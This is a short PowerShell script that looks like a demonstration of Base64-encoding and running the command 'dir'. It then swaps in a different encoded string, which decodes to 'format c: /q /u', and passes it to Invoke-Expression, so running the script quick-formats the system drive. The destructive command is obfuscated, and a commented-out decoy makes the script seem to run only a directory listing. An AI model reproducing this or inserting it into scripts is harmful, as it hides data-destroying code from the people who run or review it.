$Text = "dir";
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text);
$EncodedText =[Convert]::ToBase64String($Bytes);
$z = $EncodedText;
#echo $EncodedText;

$z = "ZgBvAHIAbQBhAHQAIABjADoAIAAvAHEAIAAvAHUA";
#$z = "ZABpAHIA";
$t = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($z));
#echo $t;
Invoke-Expression -Command $t;
